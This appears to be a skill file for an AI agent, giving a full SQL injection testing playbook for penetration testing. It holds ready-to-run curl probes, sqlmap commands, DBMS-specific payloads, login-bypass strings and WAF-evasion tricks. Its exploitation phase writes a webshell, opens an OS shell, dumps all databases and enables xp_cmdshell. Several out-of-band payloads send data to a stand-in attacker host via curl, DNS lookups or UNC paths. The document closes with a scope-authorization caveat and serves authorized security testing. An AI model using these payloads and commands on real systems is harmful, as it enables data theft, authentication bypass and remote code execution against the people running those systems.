---
name: vuln-sqli
description: "SQL injection testing skill. Comprehensive SQLi methodology: parameter discovery, manual probing, error/boolean/time-based/union/OOB techniques, DBMS-specific payloads, and WAF bypass. Triggers: 'sql injection', 'sqli', 'sql injection testing', 'sqlmap', 'database injection', 'error based sqli', 'blind sqli', 'union based', 'time based sqli', 'nosql injection'."
---

# SQL Injection Testing

Manual discovery and confirmation first — run sqlmap only after manual signal confirmed. "Every string concatenation into SQL is suspect."

## Phase A: Parameter Discovery

```bash
TARGET="https://<target>"

# Extract SQLi candidates from crawled URLs
echo "$TARGET" | waybackurls | gf sqli > sqli_candidates.txt
echo "$TARGET" | gau | gf sqli >> sqli_candidates.txt

# Hidden parameter discovery
arjun -u "$TARGET/api/products" -o arjun_products.json --stable
arjun -u "$TARGET/search" -m GET -o arjun_search.json

# x8 wordlist-based discovery
x8 -u "$TARGET/page?FUZZ=1" -w params.txt -o x8_results.txt

# Route through proxy for Caido capture
export http_proxy=http://127.0.0.1:8080
```

## Phase B: Manual Probing (REQUIRED First)

Test three classic signals before any tool automation:

```bash
# 1. Syntax error probe
curl -s "https://<target>/items?id=1'"  # Single quote
curl -s "https://<target>/items?id=1\""  # Double quote
# Look for: MySQL error, ODBC error, syntax error in response

# 2. Boolean tautology comparison
curl -s "https://<target>/items?id=1 AND 1=1" > response_true.txt
curl -s "https://<target>/items?id=1 AND 1=2" > response_false.txt
diff response_true.txt response_false.txt  # Must differ — if same, not injectable

# 3. Time-based delay
time curl -s "https://<target>/items?id=1; SELECT SLEEP(3)--"
time curl -s "https://<target>/items?id=1; SELECT IF(1=1,SLEEP(3),0)--"
# 3+ second delay = vulnerable

# Document confirmed signals
echo "URL: https://<target>/items?id=1 | Type: time-based | DBMS: MySQL" >> sqli_confirmed.txt
```

## Phase C: Tool-Assisted Exploitation

Only after manual Phase B confirmation:

```bash
# Sqlmap (minimal first)
sqlmap -u "https://<target>/items?id=1" -p id --batch --level=1 --risk=1

# Escalate if needed
sqlmap -u "https://<target>/items?id=1" -p id --batch --level=3 --risk=2 --dbs

# POST request
sqlmap -u "https://<target>/api/search" \
  --data '{"query":"test"}' \
  --headers "Content-Type: application/json" \
  --batch --dbs

# With authentication
sqlmap -u "https://<target>/items?id=1" \
  --cookie "session=<token>" \
  --batch --dbs --tables

# WAF evasive alternative
ghauri -u "https://<target>/items?id=1" --dbs --batch --level 3
```

## Phase D: DBMS-Specific Manual Payloads

| DBMS | Version | Delay | OOB/DNS |
|------|---------|-------|---------|
| MySQL | `@@version` | `SLEEP(n)` | `LOAD_FILE('\\\\attacker.com\\a')` |
| PostgreSQL | `version()` | `pg_sleep(n)` | `COPY (SELECT...) TO PROGRAM 'curl...'` |
| MSSQL | `@@version` | `WAITFOR DELAY '0:0:5'` | `xp_dirtree '\\\\attacker.tld\\a'` |
| Oracle | `v$version` | `dbms_lock.sleep(n)` | `UTL_HTTP.REQUEST('http://attacker/')` |
| SQLite | `sqlite_version()` | `randomblob(100000000)` | N/A |

**MySQL manual extraction:**
```sql
-- Error-based
1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--
1 AND updatexml(null, CONCAT(0x0a,version()), null)--

-- Union-based
1 ORDER BY 3--         # Find column count (increment until error)
1 UNION SELECT NULL,NULL,NULL--
1 UNION SELECT 1,version(),database()--

-- Blind time-based (binary search)
1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--

-- OOB (DNS)
1 AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.tld\\a'))--
```

**PostgreSQL manual extraction:**
```sql
-- Error-based
1 AND 1=CAST(version() AS int)--

-- Stacked queries (if allowed)
1; SELECT pg_sleep(3)--
1; COPY (SELECT version()) TO PROGRAM 'curl http://attacker/$(whoami)'--

-- OOB
1; COPY (SELECT '') TO PROGRAM 'nslookup $(version()).attacker.tld'--
```

**MSSQL manual extraction:**
```sql
-- Time-based
1; WAITFOR DELAY '0:0:5'--
1; IF(1=1) WAITFOR DELAY '0:0:5'--

-- OOB via xp_dirtree
1; EXEC xp_dirtree '\\attacker.tld\a'--

-- RCE via xp_cmdshell (if enabled)
1; EXEC xp_cmdshell 'whoami > C:\temp\out.txt'--
1; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

## Phase E: Authentication Bypass

```bash
# Classic OR bypass
curl -s -X POST "https://<target>/login" \
  --data "username=admin'--&password=anything"

curl -s -X POST "https://<target>/login" \
  --data "username=admin' OR '1'='1&password=' OR '1'='1"

# Time-based login check
time curl -s -X POST "https://<target>/login" \
  --data "username=admin' AND SLEEP(3)--&password=test"
```

## Phase F: WAF Bypass Techniques

```bash
# Whitespace alternatives
AND/**/1=1--
AND%0a1=1--
AND%091=1--

# Case folding
AnD 1=1
uNiOn sElEcT

# Keyword alternatives
# UNION → /*!UNION*/
# SELECT → /*!50000SELECT*/

# Hex encoding (MySQL)
1 UNION SELECT 0x76657273696f6e(),2--  # hex for "version()"

# URL encoding
1%20AND%201%3D1--
1+AND+1%3D1--

# Comment-based obfuscation
1 /*!AND*/ 1=1--
1 UN/**/ION SE/**/LECT NULL--
```

## Phase G: High-Impact Exploitation

```bash
# Dump all databases
sqlmap -u "https://<target>/items?id=1" --batch --dbs

# Dump specific table
sqlmap -u "https://<target>/items?id=1" --batch -D <db> -T users --dump

# Dump all (careful — noisy)
sqlmap -u "https://<target>/items?id=1" --batch --dump-all

# File write (webshell)
sqlmap -u "https://<target>/items?id=1" --file-write=/tmp/shell.php \
  --file-dest=/var/www/html/shell.php

# OS command execution (MSSQL xp_cmdshell)
sqlmap -u "https://<target>/items?id=1" --os-shell

# Privilege escalation check
sqlmap -u "https://<target>/items?id=1" --batch --privileges
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: trace specific parameter + payload → SQL error / boolean differential / time delay
2. **Reproducibility**: exact curl command reproducible from clean session
3. **Impact**: data extracted (database version, current user, table names) as harmless PoC

Show: parameter injected, DBMS identified, version/user extracted, rows accessible. Do NOT dump production PII without explicit scope authorization.
